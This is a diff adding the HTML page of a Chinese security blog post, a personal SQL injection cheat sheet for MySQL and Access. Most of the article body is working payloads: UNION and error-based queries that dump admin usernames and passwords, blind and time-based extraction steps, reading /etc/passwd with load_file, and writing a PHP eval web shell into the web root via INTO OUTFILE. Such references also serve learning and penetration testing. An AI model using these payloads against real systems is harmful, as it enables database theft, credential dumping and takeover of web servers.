@@ -1,0 +1,1029 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-icon-180x180.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+
+
+
+
+  <meta name="keywords" content="Web Sql注入," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="0xsisrazz" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="记录学习的注入知识，不定期更新">
+<meta name="keywords" content="Web Sql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sql注入总结">
+<meta property="og:url" content="http://www.set3rnal.xyz/2016/12/11/Sql注入总结/index.html">
+<meta property="og:site_name" content="0xsisrazz">
+<meta property="og:description" content="记录学习的注入知识，不定期更新">
+<meta property="og:updated_time" content="2018-04-11T09:38:22.943Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sql注入总结">
+<meta name="twitter:description" content="记录学习的注入知识，不定期更新">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"right","offset":30,"b2t":true,"scrollpercent":"flase","onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.set3rnal.xyz/2016/12/11/Sql注入总结/"/>
+
+
+
+
+
+  <title>Sql注入总结 | 0xsisrazz</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0xsisrazz</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-乌云镜像">
+          <a href="http://drops.isisia.xyz" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wheelchair-alt"></i> <br />
+            
+            乌云镜像
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.set3rnal.xyz/2016/12/11/Sql注入总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Set3rnal">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0xsisrazz">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Sql注入总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-12-11T16:06:23+08:00">
+                2016-12-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2016/12/11/Sql注入总结/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2016/12/11/Sql注入总结/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>记录学习的注入知识，不定期更新<br><a id="more"></a></p>
+<h2 id="常用测试语句"><a href="#常用测试语句" class="headerlink" title="常用测试语句"></a>常用测试语句</h2><table>
+<thead>
+<tr>
+<th>String</th>
+<th>numeric</th>
+<th>login</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&#39;</code></td>
+<td>and 1</td>
+<td><code>&#39;or &#39;1</code></td>
+</tr>
+<tr>
+<td><code>&#39;&#39;</code></td>
+<td>and 0</td>
+<td><code>&#39;or 1--</code></td>
+</tr>
+<tr>
+<td><code>&quot;</code></td>
+<td>and true</td>
+<td><code>&quot; or &quot;&quot;=&quot;</code></td>
+</tr>
+<tr>
+<td><code>&quot;&quot;</code></td>
+<td>and false</td>
+<td><code>&quot; or 1=1--</code></td>
+</tr>
+<tr>
+<td><code>\</code></td>
+<td>1*2</td>
+<td><code>=</code></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td><code>LIKE</code></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td><code>&#39;=0--+</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="0x00-mysql-select"><a href="#0x00-mysql-select" class="headerlink" title="0x00 mysql select"></a>0x00 mysql select</h2><h3 id="1-注释符"><a href="#1-注释符" class="headerlink" title="1.注释符"></a>1.注释符</h3><p>主要有三种</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1、#...</div><div class="line">2、&quot;--  ...&quot;</div><div class="line">3、/*...*/</div><div class="line">4、`</div><div class="line">5、;%00</div></pre></td></tr></table></figure>
+<h3 id="2-字符串连接方式"><a href="#2-字符串连接方式" class="headerlink" title="2.字符串连接方式"></a>2.字符串连接方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">concat() //concat(&apos;a&apos;,&apos;d&apos;,&apos;m&apos;,&apos;i&apos;,&apos;n&apos;)</div><div class="line">group_concat()//group_concat(&apos;a&apos;,&apos;d&apos;,&apos;m&apos;,&apos;i&apos;,&apos;n&apos;)</div><div class="line">concat_ws()//concat_ws(&apos;a&apos;,&apos;d&apos;,&apos;m&apos;,&apos;i&apos;,&apos;n&apos;)</div></pre></td></tr></table></figure>
+<h3 id="3-常用函数"><a href="#3-常用函数" class="headerlink" title="3.常用函数"></a>3.常用函数</h3><pre><code>system_user() 系统用户名
+user() 用户名
+current_user 当前用户名
+session_user()连接数据库的用户名
+database() 数据库名
+version() MYSQL数据库版本
+load_file() MYSQL读取本地文件的函数
+@@datadir 读取数据库路径
+@@basedir MYSQL 安装路径
+@@version_compile_os 操作系统
+</code></pre><h3 id="4-注入步骤"><a href="#4-注入步骤" class="headerlink" title="4.注入步骤"></a>4.注入步骤</h3><p>字段数</p>
+<pre><code>&apos; order by n#
+</code></pre><p>查看显示的字段：</p>
+<pre><code>&apos; union select 1,2#  显示多少说明第几个字段可以显示
+</code></pre><p>查看mysql基本信息</p>
+<pre><code>and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version())#
+</code></pre><p>查询数据库</p>
+<pre><code>union select 1,database(),3#
+and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1#
+and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata#
+</code></pre><p>查询表名</p>
+<pre><code>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23
+and 1=2 union select 1,2,table_name from information_schema.tables where table_schema=数据库的16进制编码 limit 1,1#
+and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=数据库的16进制编码#
+</code></pre><p>查询字段</p>
+<pre><code>and 1=2 union select 1,2,column_name from information_schema.columns where table_name=表名的十六进制编码( and table_schema=数据库的16进制编码 limit 1,1)#
+and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码#
+</code></pre><p>查询内容</p>
+<pre><code>union select 1,2,字段1,字段2 from 数据库.表#
+</code></pre><h3 id="5-mysql-读取写入文件"><a href="#5-mysql-读取写入文件" class="headerlink" title="5.mysql 读取写入文件"></a>5.mysql 读取写入文件</h3><p>在MySQL中，存在一个称为secure_file_priv的全局系统变量。 该变量用于限制数据的导入和导出操作，例如SELECT … INTO OUTFILE语句和LOAD_FILE()<br>如果secure_file_priv变量为空那么直接可以使用函数,如果为null是不能使用<br>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所以是将这个功能禁掉了<br>可通过 show variables like “secure_file_priv”;查看</p>
+<p>读文件：</p>
+<pre><code>SELECT load_file(&apos;/etc/passwd&apos;)
+load_file(char(32,26,56,66))
+load_file(0x633A5C626F6F742E696E69)  
+</code></pre><p>写文件：</p>
+<pre><code>SELECT &lt;?php @eval($_POST[1]);?&gt; into outfile &apos;/var/www/html/shell.php&apos;
+select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile &apos;&apos;#
+</code></pre><h2 id="mysql报错注入"><a href="#mysql报错注入" class="headerlink" title="mysql报错注入"></a>mysql报错注入</h2><h3 id="floor-函数报错"><a href="#floor-函数报错" class="headerlink" title="floor 函数报错"></a>floor 函数报错</h3><p>通过floor报错的方法来爆数据的本质是<code>group by</code>语句的报错。<code>group by</code>语句报错的原因是<code>floor (random(0)*2)</code>的不确定性，即可能为0也可能为1（<code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。<br><code>group by floor(random(0)*2)</code>出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下<code>floor(random(0)*2)</code>可能为0，如果此时临时表只有key为1的行，不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时<code>floor(random(0)*2)</code>结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。<br>具体原理参考：<a href="http://www.mysqlops.com/2012/05/15/mysql-sql-analyze.html）。" target="_blank" rel="external">http://www.mysqlops.com/2012/05/15/mysql-sql-analyze.html）。</a></p>
+<p>试验代码</p>
+<pre><code>mysql&gt; select 1 and (select 1 from (select count(*),concat(version(),floor(rand (0)*2))x from information_schema.tables group by x)a); ERROR 1062 (23000): Duplicate entry &apos;5.5.401&apos; for key &apos;group_key&apos;
+
+mysql&gt; select concat(0x3a,0x3a,(select database()),0x3a,0x3a); //concat()连接字符串
++-------------------------------------------------+
+| concat(0x3a,0x3a,(select database()),0x3a,0x3a) |
++-------------------------------------------------+
+| ::security:: |
++-------------------------------------------------+
+1 row in set (0.00 sec)
+mysql&gt; select concat(0x3a,0x3a,(select database()),0x3a,0x3a)a;
++--------------+
+| a                    |
++--------------+
+| ::security::      |
++--------------+
+</code></pre><p>常用代码</p>
+<p>数据库版本</p>
+<pre><code>?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+</code></pre><p>爆用户</p>
+<pre><code>?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+</code></pre><p>爆数据库名</p>
+<pre><code>?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+</code></pre><p>爆库</p>
+<pre><code>?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+</code></pre><p>爆表</p>
+<pre><code>?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+</code></pre><p>爆字段</p>
+<pre><code>?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+</code></pre><p>爆内容</p>
+<pre><code>?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns;
+select count(*),concat(0x3a,0x3a,(注入代码),0x3a,0x3a,floor(2*rand(0)))a from information_schema.tables group by a
+</code></pre><p>注：使用group by报错注入方式的注意事项<br>(1)报错语句中的count(*)不可缺少。<br>(2)from 表也不可缺少。</p>
+<h3 id="ExtractValue-有长度限制-最长32位"><a href="#ExtractValue-有长度限制-最长32位" class="headerlink" title="ExtractValue(有长度限制,最长32位)"></a>ExtractValue(有长度限制,最长32位)</h3><p>ExtractValue()函数是对XML文档进行查询和修改的函数。</p>
+<pre><code>mysql&gt; select 1 and extractvalue(1, concat(0x5c, (select user()))); 
+ERROR 1105 (HY000): XPATH syntax error: &apos;\root@localhost&apos;
+</code></pre><p>extractvalue()函数有两个参数，在实际注入时第一个参数设为1，第二个参数就是需要爆的数据。<br>如：<code>extractvalue(1, concat(0x5c,version()))</code>。<br>同样，在使用中会遇到如下面UpdateXml()类似的相同问题，即如果在爆的数据前不连接其他字符可能会显示不完全。即获取版本号时，第二个参数不能为<code>version()</code>,而应改为<code>concat(0x5c,version())</code><br>常用语句：</p>
+<pre><code>id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e))
+id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1))) 
+</code></pre><h3 id="UpdateXml"><a href="#UpdateXml" class="headerlink" title="UpdateXml"></a>UpdateXml</h3><p>UpdateXml()函数也是是对XML文档进行查询和修改的函数。<br>UpdateXml()函数有三个参数，在实际渗透时第一个和第三个参数直接写1即可，第二个参数就是需要爆出的内容，要爆出不同的内容直接修改第二个参数即可。但是在实际使用时注意一个问题：即爆错的内容可能显示不完整。</p>
+<p>示例：</p>
+<pre><code>mysql&gt; select 1 and (updatexml(1,concat(0x3a,(select user())),1)); 
+ERROR 1105 (HY000): XPATH syntax error: &apos;:root@localhost&apos;
+</code></pre><p>常用语句：</p>
+<pre><code>?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
+?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
+</code></pre><h3 id="NAME-CONST-适用于低版本"><a href="#NAME-CONST-适用于低版本" class="headerlink" title="NAME_CONST(适用于低版本)"></a>NAME_CONST(适用于低版本)</h3><pre><code>?id=330&amp;sid=19&amp;cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)--
+</code></pre><p>不好用</p>
+<h3 id="Error-based-Double-Query-Injection"><a href="#Error-based-Double-Query-Injection" class="headerlink" title="Error based Double Query Injection"></a>Error based Double Query Injection</h3><pre><code>数据库版本
+?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1
+</code></pre><h2 id="mysql-盲注"><a href="#mysql-盲注" class="headerlink" title="mysql 盲注"></a>mysql 盲注</h2><p>常用函数</p>
+<pre><code>length(str)：返回str字符串的长度。
+substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始
+mid(str,pos,len):跟上面的一样，截取字符串
+ascii(str)：返回字符串str的最左面字符的ASCII代码值。
+ord(str):同上，返回ascii码
+if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0
+left(database(),1) 取database字符串的左边第一个
+</code></pre><h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><pre><code>(select length(database()) limit 0,1) &gt; 10 --+
+(select ascii(substr(database(),1,1)) limit 0,1 ) &gt; 10 --+
+(select count(*) from table ) &gt;2        --+   
+select count(*) from information_schema.tables &gt; 10 --+
+(select length(table_name) from information_schema.tables  where table_schema=0x2312365363314 limit 0,1) &gt;10 --+
+(select ascii(substr(table_name,1,1)) from information_schema.tables  where table_schema= 0x2312365363314 limit 0,1) &gt;10 --+
+(select length(column_name) from information_schema.columns where table_schema=0x31fe312312 and table_name = 0x23124534 limit 0,1) &gt; 10 --+
+(select ascii(substr(column_name,1,1)) from information_schema.columns  where table_schema= &apos;security&apos; and table_name = &apos;users&apos; limit 0,1) &gt; 10 --+
+(select ascii(substr(flag,1,1) from flag) limit 0,1 ） &gt;10 --+
+</code></pre><p>使用ascii</p>
+<pre><code>AND ascii(substring((SELECT password FROM users where id=1),1,1))=49
+</code></pre><p>使用正则表达式</p>
+<pre><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &apos;^[a-n]&apos; LIMIT 0,1)
+</code></pre><h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>时间盲注用两个函数一个是<code>sleep</code>,一个是<code>benchmark</code>，</p>
+<p>sleep</p>
+<p>1、首先要确定数据库名的长度<br>输入</p>
+<pre><code>blind.php?username=admin&apos; and if(length((SELECT concat(database())))&lt;10,sleep(2),1)%23
+</code></pre><p>查看等待时间，当为14时，等待，说明数据库名的长度为13<br>2、猜测数据库名<br>猜测第一个字符</p>
+<pre><code>blind.php?username=admin&apos; and if(substr((SELECT concat(database())),1,1)=&apos;0&apos;,sleep(2),1)%23
+</code></pre><p>当输入测试第一个字符为r时，等待<br>猜测第二个字符</p>
+<pre><code>blind.php?username=admin&apos; and if(substr((SELECT concat(database())),2,1)=&apos;0&apos;,sleep(2),1)%23
+</code></pre><p>当输入为0时，等待<br>……<br>依据猜测，数据库名为r0866cplushua<br>3、猜测数据库中有多少个表</p>
+<pre><code>blind.php?username=admin&apos; and if((select count(TABLE_NAME) from information_schema.tables where table_schema=0x723038363663706C7573687561)=3,sleep(2),1)%23
+</code></pre><p>经过多次测试，确认有3个表<br>4、猜测第一个表名的长度</p>
+<pre><code>blind.php?username=admin&apos; and if(length((select TABLE_NAME from information_schema.tables where table_schema=0x723038363663706C7573687561 limit 0,1))=3,sleep(2),1)%23
+</code></pre><p>为3<br>5、猜测表名</p>
+<pre><code>blind.php?username=admin&apos; and if(substr((select TABLE_NAME from information_schema.tables where table_schema=0x723038363663706C7573687561 limit 1,1),5,1)=&apos;o&apos;,sleep(2),1)%23
+</code></pre><p>…..<br>最后知道有log,user,motto表名<br>6、猜测表有多少列</p>
+<pre><code>lind.php?username=admin&apos; and if((select count(COLUMN_NAME) from information_schema.columns where table_name=0x6D6F74746F )=3,sleep(2),1)%23
+</code></pre><p>经过多次测试，表motto中有3列<br>7、猜测列名长度</p>
+<pre><code>blind.php?username=admin&apos; and if(length((select COLUMN_NAME from information_schema.columns where table_name=0x6D6F74746F limit 0,1 ))=2,sleep(2),1)%23
+</code></pre><p>第一个，2个字符，第二个8个字符，第三个是5个字符<br>8、猜测列名</p>
+<pre><code>blind.php?username=admin&apos; and if(substr((select COLUMN_NAME from information_schema.columns where table_name=0x6D6F74746F limit 1,1 ),1,1)=&apos;u&apos;,sleep(2),1)%23
+</code></pre><p>第一个为id,第二列为username,第三列为motto<br>9、猜测有多少行</p>
+<pre><code>blind.php?username=admin&apos; and if((select count(*) from motto)=4,sleep(2),1)%23
+</code></pre><p>结果为4行<br>10、猜测内容</p>
+<pre><code>blind.php?username=admin&apos; and if(ASCII(substr((select motto from motto limit 0,1),1,1))=109,sleep(2),1)%23
+</code></pre><p>benchmark语法：</p>
+<p><code>BENCHMARK(count,expr)</code><br><code>BENCHMARK()</code>函数重复<code>countTimes</code>次执行表达式expr</p>
+<p>常用语句：</p>
+<pre><code>union select if(substring(current,1,1)=char(11),benchmark(5000000,encode(&apos;msg&apos;,&apos;by 5 seconds&apos;)),null) from (select database() as current) as tbl
+UNION SELECT IF(SUBSTRING(Password,1,1)=&apos;a&apos;,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = &apos;root&apos;
+</code></pre><h2 id="mysql特性"><a href="#mysql特性" class="headerlink" title="mysql特性"></a>mysql特性</h2><h3 id="1、大小写利用"><a href="#1、大小写利用" class="headerlink" title="1、大小写利用"></a>1、大小写利用</h3><p>不管你表单填写的是什么，插入到mysql数据库的时候，都会变成小写。<br>如：注册admin时显示用户已存在，你可以尝试ADMIN注册。</p>
+<h3 id="2、字符截断利用"><a href="#2、字符截断利用" class="headerlink" title="2、字符截断利用"></a>2、字符截断利用</h3><p>mysql在使用utf8的时候，一个字符的大小的上限为3字节，而当出现四个字节的字符时，是需要用使用utf8mb4编码，不使用的话，会将不识别的四字节的字符连同后面的字符串一同舍弃。<br>所以只要我们使用ascii&gt;=256的特殊字符就可以绕过了。<br>如：</p>
+<pre><code>UPDATE `wp_comments` SET `comment_content` = &apos;admin特殊字符123456 &apos; WHERE `wp_comments`.`comment_ID` =12;
+</code></pre><p>以上语句插入到数据库的内容就是admin了，后面的123456被特殊字符截断。</p>
+<h3 id="3、超过长度截断利用"><a href="#3、超过长度截断利用" class="headerlink" title="3、超过长度截断利用"></a>3、超过长度截断利用</h3><p>就是利用数据定义时，定义的长度大小截断。<br>如：</p>
+<pre><code>insert into user values (&apos;admin++++++++++++++++123456&apos;,&apos;123456&apos;);
+</code></pre><p>以上语句，如果长度限制是16位，那么插入到数据库中的时候用户名的123456被截断</p>
+<h3 id="4、MySQL等号同PHP-对等号两端不同数据类型强制转换"><a href="#4、MySQL等号同PHP-对等号两端不同数据类型强制转换" class="headerlink" title="4、MySQL等号同PHP  对等号两端不同数据类型强制转换"></a>4、MySQL等号同PHP  对等号两端不同数据类型强制转换</h3><pre><code>mysql&gt; select * from admin where &apos;1&apos;=1;
++----------+------------+----------------+
+| admin_id | admin_name | admin_password |
++----------+------------+----------------+
+|        1 | admin      | admin          |
+|        2 | set3rnal   | 123456         |
+|        0 |            |                |
++----------+------------+----------------+
+3 rows in set (0.00 sec)
+
+mysql&gt; select * from admin where admin_id = &apos;aaa&apos;=&apos;&apos;;
++----------+------------+----------------+
+| admin_id | admin_name | admin_password |
++----------+------------+----------------+
+|        1 | admin      | admin          |
+|        2 | set3rnal   | 123456         |
++----------+------------+----------------+
+2 rows in set, 1 warning (0.08 sec)
+</code></pre><h2 id="ACCESS注入"><a href="#ACCESS注入" class="headerlink" title="ACCESS注入"></a>ACCESS注入</h2><p>判断有木有admin表：</p>
+<pre><code>id=1 and exists(select * from admin)
+id=1 and(select count(*) from msysobjects)&gt;0
+</code></pre><p>判断admin表有木有id列：表名猜出来后，将count（*）替换成count（字段名）</p>
+<pre><code>id=1 and exists(select id from admin)
+id=1 and (select count(id) from admin)&gt;=0
+</code></pre><p>判断记录数/行数：</p>
+<pre><code>id=1 and (select count(1) from admin) between 1 and 2
+id=1 and (select count(1) from admin) between 3 and 4
+id=1 and (select count(1) from admin) =2
+</code></pre><p>也可以是：</p>
+<pre><code>id=1 and exists(select id from admin where id&gt;1)
+</code></pre><p>把id&gt;1改为id&lt;10，再二分法的逐渐缩小范围，最后测试admin表的id是两行<br>猜长度：</p>
+<pre><code>id=1 and (select top 1 len(username) from admin)&gt;4
+id=1 and (select top 1 len(pwd) from admin) between 15 and 20
+id=1 and (select top 1 len(pwd) from admin) =16
+</code></pre><p>最后猜出pwd列的第一行记录长度为16（如果敏感的话就猜到是16位md5值）<br>其中top 1是指第一行记录，要猜第二条记录就得</p>
+<pre><code>id=1 and (select top 1 len(pwd) from admin where pwd not in (select top 1 pwd from admin)) =16
+id=1 and (select top 1 len(pwd) from admin where pwd not in (select top 1 pwd from admin)) =32
+</code></pre><p>最后猜出pwd列的第二行记录长度为32（很大可能就是32位md5值）<br>猜内容：</p>
+<pre><code>id=1 and (select top 1 abs(asc(mid(pwd,1,1))) from admin) between asc(&quot;0&quot;) and asc(&quot;9&quot;)
+id=1 and (select top 1 abs(asc(mid(pwd,1,1))) from admin) between asc(&quot;5&quot;) and asc(&quot;9&quot;)
+id=1 and (select top 1 abs(asc(mid(pwd,1,1))) from admin) &gt;asc值
+</code></pre><p>最后猜出pwd列第一行记录的第一个字母是7<br>如果要猜pwd列第一行记录的第二个字母的话：</p>
+<pre><code>id=1 and (select top 1 abs(asc(mid(pwd,2,1))) from admin) between asc(&quot;0&quot;) and asc(&quot;9&quot;)
+id=1 and (select top 1 abs(asc(mid(pwd,2,1))) from admin) between asc(&quot;a&quot;) and asc(&quot;f&quot;)
+id=1 and (select top 1 abs(asc(mid(pwd,2,1))) from admin) =asc
+</code></pre><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><h3 id="Mysql无逗号注入："><a href="#Mysql无逗号注入：" class="headerlink" title="Mysql无逗号注入："></a>Mysql无逗号注入：</h3><pre><code>select substring((select user()) from 1 for 1); #第一种方法
+select substring((select user()) from -1); #第二种方法
+select id,ip from client_ip where 1&gt;2 union select * from ( (select user())a JOIN (select version())b )#
+</code></pre><h3 id="Rollup"><a href="#Rollup" class="headerlink" title="Rollup"></a>Rollup</h3><pre><code>&apos; or 1 group by password with rollup;
+</code></pre><p>使得数据库中password值为null，与用户提交的pass相等</p>
+<pre><code>mysql&gt; select * from user;
++-------+----------+----------------------------------+-------------------+
+| uid   | username | password                         | email             |
++-------+----------+----------------------------------+-------------------+
+|   1   | 123      | e10adc3949ba59abbe56e057f20f883e | 2637221345@qq.com |
++-------+----------+----------------------------------+-------------------+
+mysql&gt; select * from user where username = &apos;&apos; or 1 group by password with rollup;
++--------+----------+----------------------------------+-------------------+
+| uid    | username | password                         | email             |
++--------+----------+----------------------------------+-------------------+
+|   1    | 123      | e10adc3949ba59abbe56e057f20f883e | 2637221345@qq.com |
+|   1    | 123      | NULL                             | 2637221345@qq.com |
++--------+----------+----------------------------------+-------------------+
+</code></pre>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web-Sql注入/" rel="tag"># Web Sql注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/12/06/php对象注入小结/" rel="next" title="php对象注入">
+                <i class="fa fa-chevron-left"></i> php对象注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/02/14/Dword Shoot/" rel="prev" title="Dword Shoot">
+                Dword Shoot <i class="fa fa-chevron-right"></i>
